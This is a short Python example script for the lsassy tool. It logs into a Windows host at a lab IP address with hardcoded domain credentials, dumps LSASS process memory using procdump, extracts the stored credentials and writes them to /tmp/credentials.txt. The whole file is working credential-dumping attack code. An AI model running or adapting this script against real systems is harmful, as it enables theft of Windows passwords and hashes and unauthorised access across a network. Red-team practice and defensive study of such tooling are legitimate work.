# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

from lsassy import Lsassy, Logger, Dumper, Parser, Writer

log_options = Logger.Options(verbosity=2, quiet=False)
dump_options = Dumper.Options(method=2, dumpname="lsass.dmp", procdump="/opt/Sysinternals/procdump.exe")
parse_options = Parser.Options(raw=True)
write_option = Writer.Options(format="pretty", output_file="/tmp/credentials.txt")

lsassy = Lsassy(
    hostname="192.168.1.122",
    username="pixis",
    domain="adsec.local",
    password="h4cknd0",
    log_options=log_options,
    dump_options=dump_options,
    parse_options=parse_options,
    write_options=write_option
)
print(lsassy.get_credentials())
